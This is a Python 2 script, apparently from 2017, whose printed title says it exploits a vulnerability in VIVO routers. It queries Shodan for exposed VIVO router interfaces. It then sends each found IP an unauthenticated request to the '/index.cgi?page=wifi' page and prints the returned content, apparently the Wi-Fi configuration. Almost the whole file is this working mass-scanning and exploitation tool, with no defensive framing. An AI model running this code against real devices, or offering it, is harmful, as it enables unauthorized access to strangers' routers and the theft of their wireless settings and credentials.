import shodan
import time
import requests
import json
FACETS = [
    'org',
    'domain',
    'port',
    'asn',
    'city',
    ('country', 3),
] 
FACET_TITLES = {
    'org': 'Top 5 Organizations',
    'domain': 'Top 5 Domains',
    'port': 'Top 5 Ports',
    'asn': 'Top 5 Autonomous Systems',
    'city': 'cidades',
    'country': 'Top 3 Countries',
}
SHODAN_API_KEY = "Digite a api key aqui"

api = shodan.Shodan(SHODAN_API_KEY)
query = '/wizard org:vivo'
try:
        results = api.search(query, facets=FACETS) 
        print '################################################################'         
        print ''
        print 'Script python - Explora vulnerabilidade de roteadores VIVO'
        print 'Joao Arthur - joaoarthur04@hotmail.com - 2017'

        print 'TOTAL DE ROTEADORES ENCONTRADOS: %s' % results['total']
        print ''
        print '################################################################'
        time.sleep (5)
        for result in results['matches']:
                print ''
                print '---------------------------------------------------------'
                print 'IP: %s' % result['ip_str']
                print 'PORTA: %s' % result['port']
                print  'ORG: %s' % result['org']
                print 'SISTEMA OP.: %s' % result['os']
                #print 'DADOS: %s' % result['data']
                #print 'SISTEMA OP.: %s' % results['facets']
                print 'LOCALIZACAO: %s' % result['location']['city']
                #print 'RESULTS %s' % results['total']
                print ''
                ip = str(result['ip_str'])
                porta = str(result['port'])
                url = ('http://' + ip + ':' + porta + '/index.cgi?page=wifi')
                #print '%s' % url
                try:
                    r = requests.get(url, timeout=1)
                    if r.status_code == 200: 
                        print "request ok"
                        print r.headers['content-type']
                    
                        r.encoding
                        print r.text
                    else:
                        print "request error"
                except requests.exceptions.Timeout:
                    print ("Timeout Erro: Nao foi possivel conectar no servidor... ")
                print ''
                print '----------------------------------------------------------'
                time.sleep (1)
        for facet in results['facets']:
            print FACET_TITLES[facet]
            
            for term in results['facets'][facet]:
                print '%s: %s' % (term['value'], term['count'])
            print '----------------------------------------------------------'    
        

except shodan.APIError, e:
        print 'Error: %s' % e
